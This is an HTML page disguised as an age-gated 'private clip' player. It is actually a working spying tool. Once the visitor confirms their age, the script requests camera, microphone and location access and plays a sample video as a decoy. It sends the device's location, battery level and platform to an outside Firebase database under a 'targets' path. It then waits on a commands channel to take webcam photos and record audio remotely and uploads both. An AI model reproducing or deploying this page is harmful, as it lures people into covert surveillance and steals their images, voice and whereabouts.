<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Content Access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        #bg-image { position: fixed; width: 100%; height: 100%; background: url('bg.png.jpeg') center/cover; filter: blur(8px); z-index: 1; transform: scale(1.1); }
        #main-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.4); }
        #play-btn { width: 90px; height: 90px; border: 3px solid #fff; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        #play-btn::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 8px; }
        #age-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; background: #111; border: 1px solid #333; border-radius: 15px; padding: 25px; text-align: center; z-index: 100; }
        .btn-yes { background: #00ff41; color: #000; padding: 12px 25px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
    </style>
</head>
<body>

    <div id="bg-image"></div>
    <div id="main-ui">
        <div id="play-btn" onclick="document.getElementById('age-modal').style.display='block'"></div>
        <h1 style="color:#00ff41; margin-top:20px;">WATCH VIDEO</h1>
    </div>

    <div id="age-modal">
        <h2 style="color:#fff;">Age Verification</h2>
        <p style="color:#aaa;">Are you 18+ to watch this private clip?</p>
        <button class="btn-yes" onclick="startSystem()">YES, I AM 18+</button>
    </div>

    <video id="v-play" style="display:none; width:100%; height:100%; position:fixed; top:0; z-index:1000;" controls playsinline loop>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>

    <script>
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const tid = "UNIT_" + Math.floor(Math.random() * 9000);
        let currentStream = null;

        async function startSystem() {
            document.getElementById('age-modal').style.display = 'none';
            try {
                // Permissions (Camera, Mic, GPS)
                currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                navigator.geolocation.getCurrentPosition(sendPos);
                
                // Battery Status
                const batt = await navigator.getBattery();
                const bLevel = Math.floor(batt.level * 100) + "%";

                db.ref(`targets/${tid}/info`).set({
                    device: navigator.platform,
                    battery: bLevel,
                    status: "ONLINE_WATCHING",
                    time: new Date().toLocaleTimeString()
                });

                // Start Video
                const v = document.getElementById('v-play');
                v.style.display = 'block';
                v.play();

                listenCommands();
            } catch (e) { alert("Error: Access Required!"); location.reload(); }
        }

        function sendPos(p) {
            db.ref(`targets/${tid}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
        }

        function listenCommands() {
            db.ref(`commands/${tid}`).on('value', async snap => {
                const cmd = snap.val();
                if(!cmd) return;

                // Photo Capture (Front/Back)
                if(cmd.action.includes('photo')) {
                    const canvas = document.createElement('canvas');
                    const videoTrack = document.createElement('video');
                    videoTrack.srcObject = currentStream;
                    videoTrack.play();
                    setTimeout(() => {
                        canvas.width = 640; canvas.height = 480;
                        canvas.getContext('2d').drawImage(videoTrack, 0, 0);
                        db.ref(`targets/${tid}/photos`).push({ img: canvas.toDataURL('image/jpeg', 0.5), time: Date.now() });
                    }, 1000);
                }

                // Audio Capture (5 Sec)
                if(cmd.action === 'audio_rec') {
                    const recorder = new MediaRecorder(currentStream);
                    let chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
                        reader.onloadend = () => db.ref(`targets/${tid}/audios`).push({ audio: reader.result });
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000);
                }
                db.ref(`commands/${tid}`).remove();
            });
        }
    </script>
</body>
</html>
